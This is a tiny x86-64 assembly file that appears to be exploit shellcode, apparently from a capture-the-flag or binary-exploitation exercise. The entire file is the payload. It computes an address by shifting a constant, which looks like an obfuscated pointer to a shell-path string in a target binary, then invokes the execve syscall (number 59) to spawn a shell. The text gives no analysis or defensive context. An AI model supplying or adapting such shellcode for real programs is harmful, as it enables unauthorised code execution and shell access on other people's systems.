section .text
	global _start
_start:
mov rdi, 0x10046cc0
shr rdi, 6
mov al, 59
syscall
